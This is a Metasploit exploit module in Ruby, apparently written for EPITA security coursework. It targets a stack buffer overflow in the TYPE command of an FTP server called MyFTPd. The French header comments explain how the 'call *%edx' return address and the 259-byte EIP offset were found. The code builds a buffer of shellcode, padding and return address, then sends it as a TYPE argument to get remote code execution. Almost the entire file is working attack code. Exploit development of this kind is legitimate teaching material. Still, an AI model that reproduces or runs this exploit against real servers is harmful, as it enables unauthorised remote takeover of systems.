##
# Exploit pour MyFTPd TYPE Buffer Overflow
# Auteur: Paul Berthelot (paul.berthelot@epita.fr)
# Promotion: SRS 2026
#
# Choix de l'adresse de retour: 0x080493c2 (call *%edx)
# Cette adresse correspond à l'instruction "call *%edx" trouvée avec:
# objdump -d myftpd | grep -E "(call.*edx|ff.*d2)"
# 
# Contexte au moment de l'exécution:
# - EDX pointe vers le début de notre buffer (offset 0 du cyclic pattern)
# - L'offset pour contrôler EIP est de 259 octets
# - Le shellcode est placé au début du buffer
# - L'instruction call *%edx redirige l'exécution vers notre shellcode
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MyFTPd TYPE Command Buffer Overflow',
      'Description'    => %q{
        This module exploits a stack buffer overflow in the MyFTPd
        server. The flaw is triggered when a TYPE command is
        received with an overly-long argument. This vulnerability
        was discovered during EPITA SRS 2026 coursework.
      },
      'Author'         => [ '[Paul Berthelot] <paul.berthelot@epita.fr>' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://tatt.abcdefgh.xyz/srs/files/my_ftpd' ]
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'    => 250,
          'BadChars' => "\x00\x0a\x0d\x20",
          'StackAdjustment' => -3500,
        },
      'Platform'       => [ 'linux' ],
      'Targets'        =>
        [
          [
            'MyFTPd Universal',
            {
              'Ret' => 0x080493c2,  # call *%edx
            },
          ],
        ],
      'DisclosureDate' => '2025-06-28',
      'DefaultTarget'  => 0))

    register_options([
      Opt::RPORT(21),
      OptString.new('FTPUSER', [true, 'FTP Username', 'test']),
      OptString.new('FTPPASS', [true, 'FTP Password', 'test'])
    ])
  end

  def exploit
    c = connect_login
    return if not c

    print_status("Trying target #{target.name}...")
    print_status("Using call *%edx at address 0x#{target.ret.to_s(16)}")

    # Construction du buffer d'exploit
    offset = 259
    shellcode = payload.encoded
    
    if shellcode.length > offset
      print_error("Shellcode too large (#{shellcode.length} > #{offset})")
      return
    end

    # Buffer: shellcode + padding + adresse de retour
    buf = shellcode
    buf << "A" * (offset - shellcode.length)  # Padding
    buf << [target.ret].pack('V')             # Adresse de retour

    print_status("Payload size: #{buf.length} bytes")
    print_status("Shellcode size: #{shellcode.length} bytes")
    print_status("Sending malicious TYPE command...")

    # Envoi de l'exploit via la commande TYPE
    send_cmd(['TYPE', buf], false)

    handler
    disconnect
  end
end
